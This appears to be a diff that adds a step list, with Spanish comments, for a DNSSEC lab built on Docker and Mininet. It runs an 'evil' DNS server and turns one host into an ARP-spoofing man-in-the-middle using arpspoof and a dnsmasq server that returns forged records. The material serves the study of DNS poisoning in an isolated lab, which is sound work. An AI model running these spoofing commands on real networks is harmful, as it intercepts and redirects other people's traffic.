@@ -1,0 +1,37 @@
+#Pasos
+
+# Terminal 1 - levantar Docker
+cd ~/dnssec
+sudo docker compose up dns
+
+# Terminal 2 - levantar Mininet
+
+#sudo mn -c Si ocupamos borrar uno anterior
+sudo mn --topo single,3 --mac --nat
+
+# Dentro de Mininet
+h2 python3 ~/dnssec/dns/evil_dns.py &
+h1 bash -c "echo 'nameserver 10.0.0.2' > /etc/resolv.conf"
+
+h1 xterm &
+
+#Xterm h1
+echo 'nameserver 10.0.0.2' > /etc/resolv.conf
+h1 jupyter notebook --allow-root --port=8889 --no-browser --ip=10.0.0.1
+
+#Abrimos el Jupyter
+
+
+# Configurar h3 (Dropping)
+h3 sysctl -w net.ipv4.ip_forward=1
+h3 sysctl -w net.ipv4.conf.all.rp_filter=0
+h3 sysctl -w net.ipv4.conf.all.send_redirects=0
+h3 sysctl -w net.ipv4.conf.all.accept_redirects=0
+
+# Abrir xterms
+h3 xterm &
+
+# Xterm h3
+tcpdump -i h3-eth0 icmp &
+arpspoof -i h3-eth0 -t 10.0.0.1 10.0.0.2 &
+dnsmasq --no-daemon --address=/test.lab/6.6.6.6 --port=53
